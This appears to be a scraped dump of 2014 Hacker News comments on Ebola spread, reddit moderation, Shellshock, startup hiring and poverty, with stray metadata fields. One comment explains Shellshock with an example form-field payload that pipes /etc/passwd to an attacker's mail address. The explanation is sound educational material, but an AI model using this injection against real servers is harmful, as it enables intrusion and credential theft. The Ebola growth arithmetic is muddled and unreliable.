In the mathematics of exponential increase, a small initial amplification factor can produce very impressive results in a short time. Consider the hypothesis that just 1% of Ebola sufferers infect other people. Using this well-established mathematical method:<p>y&#x27; = y (1+p/100)^t<p>y = infected population % at time zero.<p>y&#x27; = infected population % at time t.<p>t = time in consistent units<p>p = percentage increase for one unit of time<p>So, if it takes a week for the infected population to increase by 1%, then:<p><a href=""http://i.imgur.com/TDPd7ug.png"" rel=""nofollow"">http://i.imgur.com/TDPd7ug.png</a><p>IOW if after a week the infected population has increased by 1%, after a year (52 weeks) the infected population has increased by 67%. After 2 years (104 weeks) the infected population has increased to 281% of the original. And so forth.<p>This isn&#x27;t true for car crashes, and the above is what is meant by an &quot;exponential increase&quot;.",1412153936

8393420,comment,8389731,8392785,1,0,XtianThrowaway,,,"The problem reddit faces is one of community identity and management of that identity, which manifests itself, basically, in never-ending moderator drama.<p>I&#x27;m commenting because I have some experience with the Christian archipelago of subreddits and because I&#x27;ve watched conservative elements of Christianity try to find a reddit home in several different stages.  (Catacombs, TheArk...)<p>I don&#x27;t think it is necessarily accurate to say that reddit is attempting to be a neutral place, overall, as I think it&#x27;s rather impossible for a community to be a wholly neutral place (and question the existence of such a thing anyway).<p>What is attempted instead is the creation of policy that allows for any community to set its own parameters and assumptions for discussion while still allowing for the creation of a policy of anonymous and uncensored participation.  There really isn&#x27;t any point to having an Internet forum without attempting these, and as soon as one wishes to depart from these goals they&#x27;re no longer really in tune with reddit.<p>> They just believe there&#x27;s some value in having a forum on reddit controlled by favorable forces even if that forum has the problems I listed.<p>Which is an interesting statement about territory within a larger community, as well as a problem as old as discourse itself.<p>I think Alexis missed your point entirely, instead making a point about personal frontpages.<p>But I can&#x27;t see it as a possibility for reddit to attempt to attract a different userbase or reddit administrators to try to neutralize reddit culture.<p>All they can really do is try is create tools for small communities to set their own culture, and I think that&#x27;s where you&#x27;re spot on; it&#x27;s currently not possible to use reddit as a platform for an arbitrary community of people because reddit is already a large community.<p>The problem, though, is that there are no arbitrary communities.",1412153796
8393419,comment,8391393,8393394,2,0,azernik,,,"I think your criticism of the article is really about the subject - this man has an ideological commitment to self-sufficiency, but the article is making a point that he has had to compromise that conceptual purity in order to get things done. Time and time again, the article points out Mr. Jabukowski&#x27;s conflicted relationship with his farm&#x27;s dependency on the outside world. For example:<p><pre><code>  The HabLab had been connected to the local water system\n  after a well ran dry, and in May it was hooked up to the \n  electrical grid. “It was an emotional trauma,” Jakubowski \n  said, and, he insisted, a temporary measure. “When we have \n  windmills and solar power up and running, that will end.”\n</code></pre>\nHe&#x27;s building a dangerous bad tractor rather than learning to repair older tractors because he sees the former as morally and ideologically superior. He&#x27;s using his homemade brick compactor rather than the commercial alternative (which the mentioned DC contractor switches to) because, in his view, the means <i>are</i> the ends. Unfortunately, because the means are so completely nuts, this collective has a hard time maintaining that level of ideological purity on the day-to-day level.<p>I wish them good luck in the future. I think the influx of veterans, who seem to have a more task-oriented approach, may save the GVCS as a practical project, but that will be by throwing out the insistence that it will be created by a society that practices the ideals of the GVCS project from the get-go.",1412153796

My name is Jonah and I&#x27;m a college student at Washington State university majoring in International Business. For the past several months, I have been working on launching an innovative advertising start-up that caters specifically to the college demographic. As any devoted entrepreneur, my idea keeps me up at night, gives me anxiety during the day, and distracts me from my school work week after week. Recently, my efforts have been focused around finding a talented developer that can build me a native app for ios. However, I don&#x27;t want just any developer working at large scale firm. No. I want a developer who shares my vision, gives creative input, and is as passionate about this project as I am. My question is, where do these individuals hide? I have exhausted my networking connections, explored my University resources, and even put ads out in college newspapers across the country. Yet for some reason, the right person hasn&#x27;t taken notice. I was wondering if anyone has suggestions on where to find a possible CTO? I realize entering into partnership with someone is a lot like marriage so obviously, I want to give myself and the project the best chances.

Is that even remotely the case with Shellshock?<p>Yes, because if Bash were sufficiently secure, then setting the value of an environment variable would be benign and harmless. If, on the other hand, bash executes arbitrary code while setting the value of an environment variable, this can cause a common and well-understood safe action to become extraordinarily dangerous. Consider this imaginary example at a website:<p>Enter name --<p>First: John<p>Last: Smith<p>Not much excitement here, unless Bash has the Shellshock vulnerability, in which case:<p>Enter name --<p>First: () { :;}; cat /etc/passwd | mail hacker@somewhere.com<p>Here&#x27;s why this is dangerous -- the file /etc/passwd is locally world-readable, which ordinarily doesn&#x27;t matter because an outsider can&#x27;t either read it or export it to another place. But if this sensitive file could be exported to another place (and if it has the content this file ordinarily doesn&#x27;t have in modern times), its contents could be decoded very rapidly without any multi-second pauses between tries or lockouts after several failed attempts such as are normal in a hacker&#x27;s login attempt.<p>One method for breaking into a system is to get a copy of /etc/passwd that can then be read over and over again at high speed, then submit the file to a password cracking program. Such a program requires a <i>local copy</i> of /etc/password to succeed, and the above hack provides it.<p>BTW I tested the above hack and it would work, if (1) a CGI script is written in a particularly careless way (no input sanitizing in place), and if (2) /etc/passwd had the content it had several years ago before this specific attack method became obvious.",1412151566

So you&#x27;re saying that when your task is &quot;process the client&#x27;s CSV file&quot; you might not necessarily be able to rely on a library handling it correctly, and that you should prepare to get your hands dirty (perhaps hacking together something with a regex or two).",1412150631

8393291,comment,8386844,8389144,2,0,briandear,,,"The opportunity gap is a myth. The real problem is cultural. Too many people believe themselves victims and act accordingly. There is certainly a very low probability of a poor person becoming a millionaire, but there are plenty of people who could go from poor to middle class if they made better decisions. For example, the poor too often gets caught up in the bread and circuses aspects to their own detriment. Do a survey of public housing projects and find out how many people have cable TV. It isn&#x27;t about the monetary cost of that cable TV but it&#x27;s a question of the opportunity cost. If someone were to spend two hours watching TV each day (actually a very low number) or if that person were to spend two hours at the public library learning something (for example learning basic coding) then in perhaps a year they might be able to find an entry level tech job. And, with the $30-60 per month they&#x27;re saving from giving up TV, they could buy a cheap Linux box to start doing some coding on ODesk or eLancr, etc. in fact, most TVs cost as much as a low cost computer. Yet, time and time again you have poor people who can tell you everything about the Kardashians and nothing about HTML. I am not suggesting everyone should be a coder, but as an example it demonstrates a problem of priorities. Barely 8 years ago, I was dead broke, even living in my car for several months. My parents didn&#x27;t go to college -- we weren&#x27;t in poverty, however if would have been easy to just follow the path of the lower middle class. Instead, I&#x27;m now a software engineer and sometimes entrepreneur making over $200k per year. I make more in a year than my dad made in almost 6 years! I am not special -- anyone who is motivated can do it. The problem is that there is a culture of dependency among much of the poor. Effectively, our society has turned the poor into a bunch of children. Contrast that to the poor in China where entrepreneurism rather than dependency is the norm. American society enables the poor. Our War on Poverty has resulted in no change to poverty rates. Perhaps it&#x27;s time to stop blaming the rich and start blaming leftist politicians who gain their power from a dependent underclass.",1412150550

You could blame me for comparing deaths by cars with deaths by pathogens but let me explain.<p>Malaria and ebola can&#x27;t be compared, malaria and cars can. Malaria and ebola are transmitted in very different way. You get malaria if you live in areas where some species of mosquitos carry the malaria plasmodium. This means that it doesn&#x27;t get you if you don&#x27;t enter one of those areas. You can&#x27;t get malaria in NYC. You can be hit by a car there because cars are definitely endemic in NYC as they are in most of the world.<p>I&#x27;m worried by malaria. I don&#x27;t like the side effects of it prophylaxis and I don&#x27;t want to risk getting sick (the prophylaxis are not completely effective) so I don&#x27;t travel in areas where it&#x27;s endemic. I sincerely hope we can make a vaccine against it.<p>I&#x27;m also worried by cars as anybody else and I take the usual measures (watch left and right before crossing a street, drive carefully) but there are few places to hide, right?<p>I&#x27;m much more worried by ebola because if it gets big enough there will be little we can do to stop it: it&#x27;s going to overcome quarantines and get to us in our cities across the oceans and it kills with 50% efficiency. If we want to think about something that could send the human population back to 3 billion in a few years we shouldn&#x27;t look at malaria or cars, but at ebola. That&#x27;s why also to me this is &quot;a far more dangerous pathogen.&quot; Let&#x27;s concentrate on ebola now, we&#x27;ll get back to malaria when we&#x27;ll have fixed it.",1412150461
